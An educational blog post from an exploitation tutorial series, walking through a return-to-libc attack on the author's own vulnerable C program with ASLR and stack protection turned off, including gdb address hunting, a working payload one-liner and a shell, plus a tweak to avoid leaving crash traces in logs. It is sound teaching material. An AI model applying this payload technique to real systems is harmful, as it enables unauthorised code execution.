---
layout: post
title: Bypassing Write XOR Execute! - Ret2Libc - Part1
categories: Reverse Engineering and Binary Exploitation Series
comments: true
---

Hey fellow pwners!

In the [previous post](/reverse/engineering/and/binary/exploitation/series/2018/12/28/security-measures-by-os.html), we discussed a few powerful security techniques that the Operating System uses to mitigate attacks. 

Starting from this post, the next few posts will be about exploit methods which aim at **bypassing** and if possible **defeating** each of the security techniques we discussed in the previous post. 

As the title of the post suggests, we will be focusing on bypassing the amazing **W XOR X** security technique.

This is the 14th post in this series. So, create a directory with name **post_14** inside **rev_eng_series**. 

## Overview 

To understand the exploit method discussed in this post, you should have understood W XOR X in detail, Function Call mechanism. In case if you are not familiar these, you can read through [post1](/reverse/engineering/and/binary/exploitation/series/2018/12/28/security-measures-by-os.html) and [post2](/reverse/engineering/and/binary/exploitation/series/2018/09/22/program-execution-internals-part-2.html) to get an idea. 

The problem at hand is, code injection exploits fail if W XOR X is enabled. But we are not stopping till we get what we want - a shell!!

We will be looking at a very simple, but an effective exploit method which will help bypass W XOR X and get a shell. 

The complete post is written with ASLR and StackGaurd **disabled**. It will be easy to demonstrate this exploit method. 

Let us disable ASLR before we go ahead. 

    rev_eng_series/post_14# echo 0 > /proc/sys/kernel/randomize_va_space


Let us get started!


## What do we have? 

Let us see what are the resources at hand: 

1. A BOF which we need to exploit. Given an address, we can use the BOF to hijack the control and execute code at that address.

2. We have the stack if we have to store some information related to the exploit. Of course not shellcode :P . 

3. One important resource we have is the **libc**. The complete **libc** is mapped into the process's address space. Can we use libc to get a shell? Let us see.


## Different ways to get a shell

Normally, there are many ways to get a shell. We have used **execve** to get a shell. There is one more library function called **system** which will simply run any command we give. So, **system("/bin/sh")** should give the shell. 

If you have read [this](/reverse/engineering/and/binary/exploitation/series/2018/10/08/buffer-overflow-vulnerability-02.html) post, I had told that there would be **no** code in a software which will **help** attackers get control of the system. But what if I told you that our beloved, useful **libc** can be used in an evil manner to get a shell. 

So, that is the idea. We have the BOF, let us use one of the above libc functions and get the god access. 

Let us get to it!

## Program

Let us use the following program for this post: 

    rev_eng_series/post_14$ cat defeat.c
    #include<stdio.h>

    void func() {

        char buffer[100];
        gets(buffer);

    }

    int main() {

        printf("Before calling func\n");
        func();
        printf("After calling func\n");

        return 0;
    }

    rev_eng_series/post_14$ gcc defeat.c -o defeat -m32 -fno-stack-protector
    defeat.c: In function ‘func’:
    defeat.c:6:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
    gets(buffer);
    ^
    /tmp/ccPIQEfQ.o: In function `func':
    defeat.c:(.text+0xe): warning: the `gets' function is dangerous and should not be used.

Let us work on the **32-bit** executable compiled without StackGaurd. Note that the process will have a non-executable stack because we didn't use the **-z execstack** option. 

Go through the program. It is pretty straight forward. There is a **gets** which makes the programm vulnerable. We have to exploit it and get the shell!

## Designing the Exploit

Let us first think how we are going to do it. How do we execute **system("/bin/sh")** using the BOF. 

1. We can use the BOF to hijack the Control Flow. 

2. As libc is mapped into the address space of the process, **system** will have an address. Find it's Address. 

3. We can overwrite the function's ReturnAddress with system's Address. This way, **system** will be called. 

4. It is not enough if **system** function is called. It has an argument - the Address of "/bin/sh" . We have to see how we can **pass** this argument to **system** function. So, we have to find **/bin/sh** in the address space. In case we don't find it, we will inject it in the buffer and use it. 

We now have the skeleton of the exploit. Let us get into the specifics of each of the steps. 


### Step2: Finding system's address

We know for sure that **system** is present in **libc**. 

This is the plan to find it's Address. 

1. Run the program using gdb. Find system's address. 

2. Get the PID and open up the maps file. Get the Starting Address of **libc.so**'s executable part. 

3. Find the difference between the Starting Address of libc.so and system's address. This will give the offset of system from the beginning of libc. 

4. Run the program normally. Open up the corresponding **/proc/PID/maps** and note the Starting Address of libc.so . 

5. Add the offset found out in step3 to the Starting Address found in step4. This is **system**'s Address. 

6. As ASLR is disabled, this address won't change. But note that even if ASLR is disabled, addresses might change - but it won't be that random. So, we have to take care of this. 

Now, we have a plan to find **system**'s address. Let us get it!

1. Finding the offset of system function from the beginning of libc.  

        rev_eng_series/post_14$ gdb -q defeat
        Reading symbols from defeat...(no debugging symbols found)...done.
        gdb-peda$ b func
        Breakpoint 1 at 0x8048441
        gdb-peda$ run

    * The program breaks at **func**. 

    * Let us now find out the address of **system**. 

            gdb-peda$ print system
            $1 = {<text variable, no debug info>} 0xf7e2fda0 <system>
            gdb-peda$ 

    * **system**'s address is **0xf7e2fda0**. 

    * Let us open up the **/proc/PID/maps** file and get the Starting Address of libc.so . 

            gdb-peda$ getpid
            21867

    * The following is the maps file: 

            rev_eng_series/post_14$ cat /proc/21867/maps
            08048000-08049000 r-xp 00000000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            08049000-0804a000 r--p 00000000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            0804a000-0804b000 rw-p 00001000 08:02 5507267                            /home/adwi/ALL/rev_eng_series/post_14/defeat
            0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
            f7df4000-f7df5000 rw-p 00000000 00:00 0 
            f7df5000-f7fa5000 r-xp 00000000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa5000-f7fa7000 r--p 001af000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa7000-f7fa8000 rw-p 001b1000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa8000-f7fab000 rw-p 00000000 00:00 0 
            f7fd3000-f7fd4000 rw-p 00000000 00:00 0 
            f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
            f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
            f7fd9000-f7ffc000 r-xp 00000000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffc000-f7ffd000 r--p 00022000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffd000-f7ffe000 rw-p 00023000 08:02 25691229                           /lib/i386-linux-gnu/ld-2.23.so
            fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

    * The Starting Address of executable part(**r-x**) of libc.so is **f7df5000**. Note that all these addresses can be different for you. But the steps are the same. 

    * Let us find the offset: 

            rev_eng_series/post_14$ python
            Python 2.7.12 (default, Nov 12 2018, 14:36:49) 
            [GCC 5.4.0 20160609] on linux2
            Type "help", "copyright", "credits" or "license" for more information.
            >>> 0xf7df5000 - 0xf7e2fda0
            -241056

    * The **offset** = 241056 bytes. 

    * I think the most important point to note is that the offset I have got here might be different from what you got. It depends on **version** of libc. My machine's libc version is **2.23**. So, calculate the offset for your libc version. 

    * The outcome is **system_offset = 241056 bytes**. 

### Finding "/bin/sh"!

Finding "/bin/sh" is very similar to finding system's address. 

1. Open up the program in gdb and use the **find** command to find "/bin/sh". 

        gdb-peda$ find "/bin/sh"
        Searching for '/bin/sh' in: None ranges
        Found 1 results, display max 1 items:
        libc : 0xf7f50a0b ("/bin/sh")

        gdb-peda$ find "/bin/bash"
        Searching for '/bin/bash' in: None ranges
        Found 1 results, display max 1 items:
        [stack] : 0xffffd07a ("/bin/bash")

    * You can see we have got it! We have both "/bin/sh" and "/bin/bash". Let us use "/bin/sh" itself. You can use either of them.

    * Address of "/bin/sh" = **0xf7f50a0b**. Note that it is found in **libc**. 

    * Let us find in which address space this is found. Let us go back to the maps file. 

            f7df5000-f7fa5000 r-xp 00000000 08:02 25691233                           /lib/i386-linux-gnu/libc-2.23.so

    * It is found in the executable space of libc.so . Let us find the offset. 

            >>> 0xf7df5000 - 0xf7f50a0b
            -1423883

    * So, **binsh_offset = 1423883 bytes**. 


### Find addresses of system and /bin/sh

In this step, let us find the addresses of system and "/bin/sh" in the process when it is run normally. 

1. Let us run the program normally and look at it's maps file. 

        rev_eng_series/post_14$ ./defeat 
        Before calling func

    * Find the PID using **ps -e**. PID of my process is 23602. Let us look at maps. 

            rev_eng_series/post_14$ cat /proc/30141/maps
            08048000-08049000 r-xp 00000000 08:02 7217665                            /home/adwi/ALL/rev_eng_series/post_14/ret2libc/defeat
            08049000-0804a000 r--p 00000000 08:02 7217665                            /home/adwi/ALL/rev_eng_series/post_14/ret2libc/defeat
            0804a000-0804b000 rw-p 00001000 08:02 7217665                            /home/adwi/ALL/rev_eng_series/post_14/ret2libc/defeat
            0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
            f7df2000-f7df3000 rw-p 00000000 00:00 0 
            f7df3000-f7fa3000 r-xp 00000000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa3000-f7fa5000 r--p 001af000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa5000-f7fa6000 rw-p 001b1000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa6000-f7fa9000 rw-p 00000000 00:00 0 
            f7fd3000-f7fd4000 rw-p 00000000 00:00 0 
            f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
            f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
            f7fd9000-f7ffc000 r-xp 00000000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffc000-f7ffd000 r--p 00022000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffd000-f7ffe000 rw-p 00023000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
    * Find **system**'s address:  
    
            ->system_address = starting_address + system_offset
            ->system_address = 0xf7df3000 + 241056
            ->system_address = 0xf7e2dda0
        
        * **system_address = 0xf7e2dda0**. 

    * Find **/bin/sh**'s address: 

            ->binsh_address = starting_address + binsh_offset
            ->binsh_address = 0xf7df3000 + 1423883
            ->binsh_adresss = 0xf7f4ea0b
        
        * **binsh_address = 0xf7f4ea0b**. 

    * Note that when you run the program multiple times, these addresses might change. So, you will have to repeat the above step probably multiple times if the address changes. 

    * Finally, **system_address = 0xf7e2dda0** and **binsh_address = 0xf7f4ea0b** . 


### How do we "call" system? 

We have a BOF. We can overwrite the ReturnAddress with the system_address. The control will just jump to **system** function but nothing will happen because we have not passed the required argument. It has an argument - the **binsh_address**. 

What we have is a **Return back to middle of another function** but what we want is **Call a new function**. Note the difference. When you are returning back to a function, you just execute the **ret** instruction - jump to ReturnAddress and pop ReturnAddress off the stack. But calling a function is different. For a function to be called, arguments are first pushed into the stack, the **call** is executed. The **ReturnAddress is pushed** and control is given to the first instruction of the function. A StackFrame is constructed and only then the function execution starts. 

So, there is a lot of difference between Returning back to middle of another function and Calling a new function. Look at the followin diagrams: 

                LowerAddress
                                  
    |    Address    |                           |               |       
    |               |                           |               |
    |               |                           |               |
    |               |           ret             |               |
    |               |   ------------------->    |               |   + Control goes to instruction at Address
    |               |                           |               |
    |               |                           |               |
    |               |                           |               |
    |               |                           |               |

      StackDiagram1                               StackDiagram2

        
        Return Back to middle of another function(diagram with respect to callee function) - Scenario1


                LowerAddress
 
    |     Argument3     |                       |  NewReturnAddress |                    
    |     Argument2     |                       |     Argument3     |                           
    |     Argument1     |                       |     Argument2     |                           
    |     Argument0     |      call Function    |     Argument1     |        
    |                   |  ----------------->   |     Argument0     |   --> Now, Function gets executed. 
    |                   |                       |                   |                           
    |                   |                       |                   |                           
    |                   |                       |                   |                           
    |                   |                       |                   |                           
    
        StackDiagram3                               StackDiagram4                             


                    Calling a new function (diagram with respect to callee function) - Scenario2


What we have is Scenario1. The plan is the **Address** in StackDiagram1 is **system_address**. This will make sure control is transfered to **system** function. Suppose control is transfered to **system**. With respect to **system**, the stack looks like StackDiagram2. It is empty. It has nothing. For any Function to get executed properly, it's StackFrame should look like in StackDiagram4. 

So, we have to convert StackDiagram2 to StackDiagram4. How do we do it? We just **construct** it. 

We will construct a **fake StackFrame** which will give **system** an illusion that it is being **called** normally by executing a **call** instruction. But the reality is we are using Control Flow Hijacking (with the help of **ret**) to execute **system** which is not normal. 

So, the stack should look like this: 

                    LowerAddress

    |   system_address  |                       |  NewReturnAddress |
    |  NewReturnAddress |          ret          |      Argument0    |
    |     Argument0     |   ---------------->   |                   |      + Control is transferred to system function. 
    |                   |                       |                   |
    |                   |                       |                   |


The ReturnAddress of vulnerable function(**func**) is overwritten by **system_address**. The job doesn't end at overwriting there. We have to write NewReturnAddress and Argument0 next to **system_address**. 

This view of stack of **func** might help:  

    <Buffer - 100 bytes><Padding - 8 bytes><Old ebp - 4 bytes><ReturnAddress - 4 bytes>

This has to converted to this with the help of gets. 

    <          'a' - 108 bytes            ><  'b' - 4 bytes  ><system_address - 4 bytes><NewReturnAddress - 4 bytes><binsh_address>


Once we are done with this, we have successfully converted the "Returning back to a function" stack to "Calling a new function" Stack. 

Now that we have a plan, let us execute it. 

### Craft the payload

We know how the payload should look like. It should look like this:

    <          'a' - 108 bytes            ><  'b' - 4 bytes  ><system_address -4 bytes><NewReturnAddress - 4 bytes><binsh_address>

One thing to think about is, where will the **system** function return control back to? It was not actually called from any function. We have created that illusion by constructing a fake stackframe. But **system** is innocent and doesn't know that. 

For now, let us give NewReturnAddress = 'cccc'. 

This is the payload: 

    rev_eng_series/post_14$ python -c "print 'a' * 108 + 'b' * 4 + '\xa0\xdd\xe2\xf7' + 'c' * 4 + '\x0b\xea\xf4\xf7'" > exploit.txt

Now, **exploit.txt** has the exploit payload. 

Only thing to do is run the vulnerable program again and inject this payload. 

### Exploit it!

Let us first open the program in gdb and see if we can get the shell or not.

    rev_eng_series/post_14$ gdb -q defeat
    Reading symbols from defeat...(no debugging symbols found)...done.
    gdb-peda$ run < exploit.txt 
    Starting program: /home/adwi/ALL/rev_eng_series/post_14/defeat < exploit.txt
    Before calling func
    [New process 31425]
    process 31425 is executing new program: /bin/dash
    warning: the debug information found in "/lib64/ld-2.23.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

    [Inferior 2 (process 31425) exited normally]
    Warning: not running or target is remote
    gdb-peda$ 

Bingo! We got the shell. It says "executing new program: /bin/dash" . This is a success! 


Now, let us exploit the program without gdb. 

    rev_eng_series/post_14$ cat exploit.txt - | ./defeat 
    Before calling func

    whoami
    adwi

    who
    adwi     tty7         2019-03-03 07:51 (:0)
    
    ls
    defeat defeat.c  exploit.txt

Awesome! So, we just got a proper working shell!

### Is that it?

I guess not. 

Let us close that shell which we got by exploiting the program. You type in **Ctrl+D** or **Ctrl+C**, the program won't end peacefully. It **SegFaults**. 

Yes, we got a shell. But if the program segfaults, that probably goes into the system log. This leaves footprints of this program getting exploited. 

We have to make our exploit as **stealthy** as possible. 

We have to do something to so that the program doesn't Segfault after we close that shell. 

A possible solution: Now, **system** is trying to return to **0x63636363** and that is why the program is SegFaulting. We can instead make it return to **exit** function, which will make sure the program terminates peacefully. 

Let us find **exit**'s address the same way we found **system**'s. Run **defeat** once using gdb and grab all required details. 

* **libc_address** = **0xf7df3000**
* **exit_address** = **0xf7e219d0**

The **exit_offset** = 190928

With that, let us run the **defeat** program normally and find out **exit**'s address. **exit_address** = **0xf7e219d0** . Though the above address and this is same, it might vary. So, finding the offset and then calculating the address without gdb is important. 

Now, the following is our new exploit payload: 

    <          'a' - 108 bytes            ><  'b' - 4 bytes  ><system_address -4 bytes><exit_address - 4 bytes><binsh_address>

Let us copy the exploit into **exploit.txt** . 

    rev_eng_series/post_14$ python -c "print 'a' * 108 + 'b' * 4 + '\xa0\xdd\xe2\xf7' + '\xd0\x19\xe2\xf7' + '\x0b\xea\xf4\xf7'" > exploit.txt
    
Let us run this exploit and see if it works or not: 

    rev_eng_series/post_14$ cat exploit.txt - | ./defeat Before calling func

    whoami
    adwi

    who
    adwi     tty7         2019-03-03 07:51 (:0)

    ^C
    rev_eng_series/post_14$

Bingo!

Look at that! It did not SegFault even after we exited from the shell. So, our exploit is better now. 


In the process of doing this, we overlooked an important thing. The **exit** function takes in an argument - the exit code. Eg: exit(1), exit(0) etc., 

But here, we did not supply anything argument. We just jumped directly to execute **exit**. But it worked! You checkout for yourself why its working.

## What did we just do?

We just **bypassed** the **W XOR X** security technique in the Operating System and got a shell. Its celebration time !! :P

We did not inject even a single instruction to achieve this. All we did was find a few useful, potential shell-giving functions in **libc**, find appropriate arguments for those functions. Then use BOF to execute those functions. As we **returned** to a **libc** function, this exploit method is also known as **Ret2Libc** exploit method.

In other words, we **reused** whatever was present in the process's Address Space and exploit that same process. Such exploits are called **code-reuse exploits**.

I learnt an important lesson here. Till now, we just focussed on the stack, executing shellcode in stack etc., But now, we have expanded our territory :P 

We have the **complete address space** for ourself. Whatever address ranges we can find in the **/proc/PID/maps** file is ours. We can make use of **anything** to get the exploit ready. 

Suppose the string **/bin/sh** is not found anywhere in the address space, we can take **.data** segment's help. Write **/bin/sh** into **.data** segment using the **write** function and then call **system** . 

**Do not forget to enable ASLR**. 

## Conclusion

With this, I would like to end this post. 

The status is this. We have bypassed **W XOR X** security method to get a shell. 

But, this is not powerful enough. In [this post](/reverse/engineering/and/binary/exploitation/series/2018/12/07/exploitation-using-code-injection-part03.html), we were able to get remote access to the victim system using code-injection. Code-Injection exploitation method also gave the flexibility to do anything. If you have a large enough buffer, you can achieve anything. But, then came W XOR X. 

We have just demostrated that W XOR X can be broken in this post. But, we have not explored the actual power of **Ret2Libc** method. 

In the next post, we will be exploring **Ret2Libc** in more detail. We will be exploring combinations of different exploit methods, how powerful they can be.

This article taught me a lot. I realized how powerful this exploit method is.

I hope you learnt something out of it. 

Thank you for reading and happy hacking :)

----------------------------------------------------------
[Go to next post: Defeating Write XOR Execute! - Ret2Libc - Part2](/reverse/engineering/and/binary/exploitation/series/2019/03/06/return-to-libc-part2.html)                                                     
[Go to previous post: How does the Operating System defend itself?](/reverse/engineering/and/binary/exploitation/series/2018/12/28/security-measures-by-os.html)


